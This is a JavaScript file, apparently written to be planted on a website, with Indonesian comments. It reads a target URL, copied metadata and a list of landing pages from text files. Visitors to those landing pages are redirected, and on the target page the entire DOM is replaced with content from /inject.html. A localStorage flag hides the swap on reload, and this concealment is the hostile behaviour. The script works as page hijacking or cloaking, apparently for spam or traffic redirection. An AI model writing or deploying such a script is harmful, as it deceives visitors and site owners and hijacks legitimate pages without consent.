console.log('kolek.js is being loaded...'); // Log awal untuk memastikan file dimuat
window.onerror = (message, source, lineno, colno, error) => {
  console.error('Global error caught:', { message, source, lineno, colno, error });
};
debugger;
console.log('kolek.js script is running...');
(function () {
  console.log('Script started.'); // Log awal untuk memastikan kode dijalankan

  // Periksa apakah injeksi sudah dilakukan sebelumnya
  const targetInjectedKey = 'targetInjected';
  const currentUrl = new URL(location.href).href; // Normalisasi URL saat ini
  if (localStorage.getItem(targetInjectedKey) === currentUrl) {
    console.log('Page reload detected. Using original HTML without injection.');
    return; // Hentikan eksekusi lebih lanjut
  }

  // Fungsi untuk membaca file eksternal
  const fetchFileContent = async (filePath) => {
    console.log(`Fetching file: ${filePath}`); // Log untuk melacak file yang sedang diambil
    const response = await fetch(filePath);
    if (!response.ok) {
      console.error(`Failed to fetch ${filePath}: ${response.status}`);
      throw new Error(`Failed to fetch ${filePath}`);
    }
    const text = await response.text();
    console.log(`File fetched successfully: ${filePath}`);
    return text;
  };

  // Fungsi untuk menyisipkan metadata asli ke dalam DOM
  const injectMetadata = (metadata) => {
    console.log('Injecting metadata...'); // Log sebelum menyisipkan metadata
    const parser = new DOMParser();
    const doc = parser.parseFromString(metadata, 'text/html');

    // Sisipkan <title>
    const title = doc.querySelector('title');
    if (title) {
      document.title = title.textContent;
      console.log('Title injected:', title.textContent);
    }

    // Sisipkan <meta> dan <link>
    const head = document.head;
    doc.querySelectorAll('meta, link').forEach((meta) => {
      head.appendChild(meta.cloneNode(true));
      console.log('Injected meta/link:', meta.outerHTML);
    });
    console.log('Metadata injected successfully.');
  };

  // Membaca URL dari target.txt, metadata dari metadata.txt, dan daftar halaman dari landingpage.txt
  Promise.all([
    fetchFileContent('/target.txt'),
    fetchFileContent('/metadata.txt'), // Ambil metadata asli dari metadata.txt
    fetchFileContent('/landingpage.txt'), // Ambil daftar halaman dari landingpage.txt
  ])
    .then(([targetUrl, originalHtml, landingPages]) => {
      console.log('All files fetched successfully.'); // Log setelah semua file berhasil diambil
      console.log('Current URL:', currentUrl);

      // Periksa apakah URL saat ini cocok dengan salah satu URL di landingpage.txt
      const landingPageUrls = landingPages
        .split('\n')
        .map((url) => new URL(url.trim(), location.origin).href); // Normalisasi URL dari landingpage.txt

      // Fungsi untuk mendapatkan tujuan akhir dari URL
      const getFinalUrl = (url) => {
        try {
          console.log(`Parsing target URL: ${url}`); // Log tambahan untuk memeriksa URL sebelum parsing
          const parsedUrl = new URL(url);
          const finalUrl = parsedUrl.searchParams.get('url'); // Ambil parameter 'url'
          console.log(`Final URL extracted: ${finalUrl || url}`); // Log tambahan untuk memeriksa URL setelah parsing
          return finalUrl ? finalUrl : url; // Jika tidak ada parameter 'url', gunakan URL asli
        } catch (err) {
          console.error('Error parsing URL:', url, err);
          return url; // Jika parsing gagal, kembalikan URL asli
        }
      };

      const finalTargetUrl = getFinalUrl(targetUrl.trim()); // Dapatkan tujuan akhir dari target.txt
      console.log(`Final target URL: ${finalTargetUrl}`); // Log tambahan untuk memeriksa nilai finalTargetUrl

      if (landingPageUrls.includes(currentUrl)) {
        console.log('Current URL matches a landing page. Injecting metadata...');
        injectMetadata(originalHtml); // Sisipkan metadata asli dari metadata.txt

        console.log('Redirecting to target.txt with 302...');
        setTimeout(() => {
          console.log(`Redirecting to: ${finalTargetUrl}`); // Log tambahan untuk memastikan URL redirect
          location.replace(finalTargetUrl); // Redirect ke tujuan akhir dari target.txt dengan 302
        }, 300); // Tingkatkan jeda waktu untuk memastikan metadata disisipkan
        return; // Hentikan eksekusi lebih lanjut
      }

      // Periksa apakah URL saat ini cocok dengan tujuan akhir dari target.txt
      if (currentUrl === finalTargetUrl) {
        console.log('Current URL matches target.txt. Injecting HTML...');
        const injectHtmlPath = '/inject.html';
        console.log(`Attempting to fetch: ${injectHtmlPath}`); // Log tambahan untuk jalur file

        fetch(injectHtmlPath)
          .then((response) => {
            if (!response.ok) {
              console.error(`Failed to load ${injectHtmlPath}:`, response.status);
              throw new Error(`Failed to load ${injectHtmlPath}`);
            }
            console.log(`${injectHtmlPath} fetched successfully.`);
            return response.text();
          })
          .then((html) => {
            console.log('Injecting HTML content into DOM...');
            document.documentElement.innerHTML = html; // Mengganti seluruh DOM dengan konten inject.html
            console.log('HTML content injected successfully.');

            injectMetadata(originalHtml); // Sisipkan metadata asli dari metadata.txt

            // Simpan status injeksi ke localStorage
            localStorage.setItem(targetInjectedKey, currentUrl);
            console.log('Injection status saved to localStorage.');
          })
          .catch((err) => {
            console.error('Error during HTML injection:', err);
            alert('Failed to load the required content. Please try again later.'); // Fallback untuk pengguna
          });
      } else {
        console.warn('Current URL does not match target URL. Injection skipped.');
        console.log(`Expected target URL: ${finalTargetUrl}`); // Log tambahan untuk memeriksa URL yang diharapkan
        console.log(`Current URL: ${currentUrl}`); // Log tambahan untuk memeriksa URL saat ini
      }
    })
    .catch((err) => console.error('Error loading URLs:', err));
})();